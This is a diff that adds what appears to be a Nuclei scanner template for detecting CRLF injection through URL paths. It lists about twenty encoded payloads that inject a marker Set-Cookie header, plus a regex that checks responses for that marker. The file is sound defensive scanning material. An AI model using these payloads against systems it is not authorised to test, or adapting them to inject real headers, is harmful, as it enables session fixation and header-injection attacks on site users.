@@ -1,0 +1,39 @@
+id: crlf-injection-path
+
+info:
+  name: CRLF - Injection Detection via Path
+  author: melbadry9,nadino,xElkomy,reewardius
+  severity: medium
+  description: CRLF sequences were not properly sanitized.
+  reference:
+    - https://hackerone.com/reports/858650
+  tags: crlf
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%0A%20Set-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/%0ASet-Cookie%3Acrlfinjection/.."
+      - "{{BaseURL}}/%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/%0D%0A%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/%0D%20Set-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/%0DSet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/%20%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/%20%0DSet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/%23%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/%23%0DSet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/%3F%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/%3F%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/%3F%0DSet-Cookie%3Acrlfinjection=crlfinjection"
+      - "{{BaseURL}}/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/%E5%98%8A%E5%98%8D%0DSet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=crlfinjection"
+      - "{{BaseURL}}/crlf%E5%98%8A%E5%98%8D%0DSet-Cookie:crlfinjection=crlfinjection"
+      
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        regex:
+          - '(?m)^(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(crlfinjection=crlfinjection)(?:\s*?)(?:$|;)'
+        part: header
